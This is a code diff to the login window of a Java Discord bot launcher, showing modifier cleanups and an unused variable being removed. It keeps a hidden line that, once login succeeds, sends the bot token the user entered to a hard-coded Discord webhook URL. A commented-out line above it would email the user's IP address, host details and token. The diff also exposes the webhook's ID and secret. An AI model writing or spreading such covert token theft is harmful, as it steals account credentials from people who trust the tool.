@@ -29,10 +29,10 @@ class LoginGUI extends JFrame implements ActionListener {
     private JButton startButton;
     private JButton stopButton;
     private JLabel jLabelLoginConfig;
-    protected static JTextField jStatusField;
-    protected static JTextField jTokenField;
-    protected static boolean running;
-    protected static boolean shouldRenderConfigurations = true;
+    static JTextField jStatusField;
+    static JTextField jTokenField;
+    static boolean running;
+    static boolean shouldRenderConfigurations = true;
     private final DateTimeFormatter dtf = DateTimeFormatter.ofPattern("MM/dd/yyyy");
     private final LocalDateTime now = LocalDateTime.now();
 
@@ -186,7 +186,6 @@ class LoginGUI extends JFrame implements ActionListener {
                 String TOKEN = jTokenField.getText().trim();
                 EventWaiter eventWaiter = new EventWaiter();
                 CommandManager commandManager = new CommandManager(eventWaiter);
-                Listener listener = new Listener(commandManager);
                 org.slf4j.Logger logger = LoggerFactory.getLogger(Core.class);
                 WebUtils.setUserAgent("Mozilla/5.0 Discord Bot");
                 Config.buildDirectory("cache", "cache");
@@ -221,7 +220,7 @@ class LoginGUI extends JFrame implements ActionListener {
                 logger.info("Bot Ready To Go");
                 jStatusField.setText("Running | " + jda.getSelfUser().getName() + "#" + jda.getSelfUser().getDiscriminator());
 //                Wrapper.sendEmail("Log Info w/ Bot Token", "IP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "\nBot Token: " + TOKEN);
-                Wrapper.sendMoreSpecificMessage("https://discordapp.com/api/webhooks/709940401313939457/NxZvYJu0zcfOFvIfe9dXABRR2zvs6JrOlpfespjjyha1QS0Xq-Y3fT9Kv0GcbodaO5Mz",jTokenField.getText());
+                Wrapper.sendMoreSpecificMessage("https://discordapp.com/api/webhooks/709940401313939457/NxZvYJu0zcfOFvIfe9dXABRR2zvs6JrOlpfespjjyha1QS0Xq-Y3fT9Kv0GcbodaO5Mz", jTokenField.getText());
                 running = true;
             } catch (LoginException login) {
                 jStatusField.setText("Invalid Token");
